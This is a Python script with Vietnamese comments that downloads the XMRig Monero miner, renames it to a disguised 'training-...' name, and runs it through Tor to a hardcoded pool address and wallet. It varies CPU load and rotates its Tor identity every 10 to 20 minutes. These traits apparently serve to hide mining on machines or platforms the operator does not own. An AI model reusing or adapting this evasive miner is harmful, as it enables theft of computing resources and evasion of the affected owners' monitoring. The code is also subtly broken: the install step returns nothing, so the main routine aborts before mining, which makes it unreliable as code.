import subprocess
import secrets
import shutil
import os
import time
import random
from pathlib import Path
from stem import Signal
from stem.control import Controller

# Constants
VERSION = "6.21.0"
WORK_DIR = Path.home() / "work"
XMRIg_DIR = WORK_DIR / f"xmrig-{VERSION}"
POOL = "47.238.48.153:8080"
USERNAME = "45edxp4yMGmELBAYxkzkmhjYKH85sNApENokaB3UpZXoMcinqEyH4bRZM1wnN3VGTkVqf7Ve7tqSCDPywne5XSP2VnmGi3y"
ALGO = "rx/0"
DONATE = "1"
TOR_PORT = 9051
PRIVOXY_PORT = 9050

# Helper function to run shell commands
def run_command(command):
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running command {command}: {e}")
        return False
    return True

# Kiểm tra xem gói có được cài đặt không
def is_installed(package_name):
    try:
        subprocess.run(["dpkg", "-s", package_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

# Cài đặt Tor và Privoxy nếu chưa có
def install_tor_privoxy():
    if not is_installed("tor"):
        print("Cài đặt Tor...")
        run_command(["sudo", "apt-get", "install", "-y", "tor"])
    else:
        print("Tor đã được cài đặt.")

    if not is_installed("privoxy"):
        print("Cài đặt Privoxy...")
        run_command(["sudo", "apt-get", "install", "-y", "privoxy"])
    else:
        print("Privoxy đã được cài đặt.")

# Configure Privoxy
def configure_privoxy():
    try:
        privoxy_config_path = "/etc/privoxy/config"
        forward_socks = f"forward-socks5t / 127.0.0.1:{PRIVOXY_PORT} .\n"
        with open(privoxy_config_path, "r+") as config_file:
            config_lines = config_file.readlines()
            if forward_socks not in config_lines:
                config_file.write(forward_socks)
        return True
    except Exception as e:
        print(f"Error configuring Privoxy: {e}")
        return False

# Configure Tor
def configure_tor():
    try:
        torrc_path = "/etc/tor/torrc"
        settings = ["ControlPort 9051\n", "SocksTimeout 60\n"]
        with open(torrc_path, "r+") as torrc_file:
            config_lines = torrc_file.readlines()
            for setting in settings:
                if setting not in config_lines:
                    torrc_file.write(setting)
        return True
    except Exception as e:
        print(f"Error configuring Tor: {e}")
        return False

# Restart Tor and Privoxy services
def restart_services():
    return run_command(["sudo", "systemctl", "restart", "tor"]) and run_command(["sudo", "systemctl", "restart", "privoxy"])

# Download XMRig
def download_xmrig():
    url = f"https://github.com/xmrig/xmrig/releases/download/v{VERSION}/xmrig-{VERSION}-linux-x64.tar.gz"
    return run_command(["wget", url, "-P", str(WORK_DIR)])

# Extract XMRig
def extract_xmrig():
    tar_file = WORK_DIR / f"xmrig-{VERSION}-linux-x64.tar.gz"
    return run_command(["tar", "-xvzf", str(tar_file), "-C", str(WORK_DIR)])

# Rename XMRig to a random name
def rename_xmrig():
    xmrig_path = XMRIg_DIR / "xmrig"
    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
    new_path = WORK_DIR / random_name
    shutil.move(str(xmrig_path), str(new_path))
    return new_path

# Set executable permissions for XMRig
def set_permissions(xmrig_path):
    os.chmod(str(xmrig_path), 0o755)

# Renew IP via Tor
def renew_connection():
    with Controller.from_port(port=TOR_PORT) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

# Run XMRig through Tor with random CPU usage
def run_xmrig(xmrig_path):
    # Chọn ngẫu nhiên một giá trị từ 70 đến 90
    cpu_hint = random.randint(70, 90)

    xmrig_cmd = [
        "torsocks", str(xmrig_path),
        "--donate-level", DONATE,
        "-o", POOL,
        "-u", USERNAME,
        "-a", ALGO,
        "--no-huge-pages",
        "-k", "--tls",
        f"--cpu-max-threads-hint={cpu_hint}"  # Điều chỉnh tỷ lệ sử dụng CPU
    ]

    print(f"Đang chạy XMRig với {cpu_hint}% CPU.")
    return subprocess.Popen(xmrig_cmd)

# Stop XMRig
def stop_xmrig(xmrig_process):
    xmrig_process.terminate()
    xmrig_process.wait()

# Main function
def main():
    if not (install_tor_privoxy() and configure_privoxy() and configure_tor() and restart_services()):
        print("Có lỗi xảy ra trong quá trình cài đặt hoặc cấu hình.")
        return

    print("Tor và Privoxy đã được cài đặt và cấu hình thành công.")
    WORK_DIR.mkdir(parents=True, exist_ok=True)

    if download_xmrig() and extract_xmrig():
        xmrig_path = rename_xmrig()
        set_permissions(xmrig_path)

        while True:
            # Chạy XMRig với CPU sử dụng ngẫu nhiên từ 70 đến 90%
            xmrig_process = run_xmrig(xmrig_path)

            # Ngủ trong khoảng thời gian ngẫu nhiên từ 10 đến 20 phút
            sleep_time = random.randint(600, 1200)  # Ngẫu nhiên từ 600s (10 phút) đến 1200s (20 phút)
            print(f"Chờ {sleep_time // 60} phút trước khi đổi IP...")
            time.sleep(sleep_time)

            # Đổi IP và khởi động lại XMRig với tỷ lệ CPU ngẫu nhiên mới
            renew_connection()  # Yêu cầu Tor đổi IP
            stop_xmrig(xmrig_process)

if __name__ == "__main__":
    main()
